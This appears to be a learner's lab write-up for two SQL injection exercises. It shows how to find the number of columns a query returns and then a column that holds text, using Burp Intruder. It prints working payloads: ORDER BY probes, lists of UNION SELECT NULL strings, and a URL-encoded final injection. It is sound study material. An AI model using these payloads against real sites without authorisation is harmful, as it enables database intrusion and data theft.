# Lab: SQL injection UNION attack, determining the number of columns returned by the query

![Pasted image 20241030154632.png](../../../../../IMAGES/Pasted%20image%2020241030154632.png)

To begin with this lab let's take a look at the page:

![Pasted image 20241030154840.png](../../../../../IMAGES/Pasted%20image%2020241030154840.png)

We have a `refine your search` section, let's send the request to burp to analyze it:

![Pasted image 20241030155112.png](../../../../../IMAGES/Pasted%20image%2020241030155112.png)

We have a `filter?category=` section, I believe this is our injectable section, let's begin with the SQLI:


For this, I will use the notes from [SQLI](SQL%20INJECTION%20(SQLI).md), let's send our request to intruder and start the attack in the following way:


![Pasted image 20241030155422.png](../../../../../IMAGES/Pasted%20image%2020241030155422.png)

![Pasted image 20241030155739.png](../../../../../IMAGES/Pasted%20image%2020241030155739.png)

Let's launch the attack:

![Pasted image 20241030155927.png](../../../../../IMAGES/Pasted%20image%2020241030155927.png)
Judging based on the status code and response, we can pretty much visualize `' ORDER BY 3--` was the successful payload, let's look at the response:

![Pasted image 20241030160033.png](../../../../../IMAGES/Pasted%20image%2020241030160033.png)

![Pasted image 20241030160134.png](../../../../../IMAGES/Pasted%20image%2020241030160134.png)


Now, knowing that 3 is the right one, let's use the UNION attack:

```ad-important
##### USED:


`sql`

'+UNION+select+NULL--
'+UNION+select+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--
'+UNION+select+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL,+NULL--


```



Let's use intruder again the test our payloads:


![Pasted image 20241030161904.png](../../../../../IMAGES/Pasted%20image%2020241030161904.png)

So, the payload that worked was this:

```sql
'+UNION+select+NULL,+NULL,+NULL--
```


Let's send the request and finish the lab:



![Pasted image 20241030162009.png](../../../../../IMAGES/Pasted%20image%2020241030162009.png)

## EXPLANATION VIDEO

<iframe width="800" height="545" src="https://www.youtube.com/embed/umXGHbEyW5I" title="SQL Injection - Lab #3 SQLi UNION attack determining the number of columns returned by the query" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



# Lab: SQL injection UNION attack, finding a column containing text


![Pasted image 20241030162905.png](../../../../../IMAGES/Pasted%20image%2020241030162905.png)

## SENDING THE REQUEST

![Pasted image 20241030171439.png](../../../../../IMAGES/Pasted%20image%2020241030171439.png)

So, taking advantage of the notes I took previously, this is what could work:

```ad-important

`' UNION SELECT 'a',NULL,NULL,NULL--`
`' UNION SELECT NULL,'a',NULL,NULL--`
`' UNION SELECT NULL,NULL,'a',NULL--`
`' UNION SELECT NULL,NULL,NULL,'a'--`
```


Let's try, first, let's send the request to intruder and launch the attack:


```ad-important

##### USED PAYLOAD:


' UNION select 'abcdef'--
' UNION select NULL,'abcdef',NULL--
' UNION select NULL,NULL,'abcdef',NULL--
' UNION select NULL,NULL,NULL,'abcdef'--
' UNION select NULL,NULL,NULL,NULL,'abcdef'--
' UNION select NULL,NULL,NULL,NULL,NULL,'abcdef'--




```


![Pasted image 20241030173119.png](../../../../../IMAGES/Pasted%20image%2020241030173119.png)

If we launch the attack, we realize that:

`' UNION select NULL,'abcdef',NULL--` 

Was successful:


![Pasted image 20241030173318.png](../../../../../IMAGES/Pasted%20image%2020241030173318.png)

So, we can finish the lab by sending the following request:


`' UNION select NULL,'0lrAqo',NULL--`


But since we need to send it encoded, this would be what we need to send:

`%27%20UNION%20select%20NULL%2C%270lrAqo%27%2CNULL--`


![Pasted image 20241030173523.png](../../../../../IMAGES/Pasted%20image%2020241030173523.png)


## EXPLANATION VIDEO

<iframe width="800" height="600" src="https://www.youtube.com/embed/SGBTC5D7DTs" title="SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
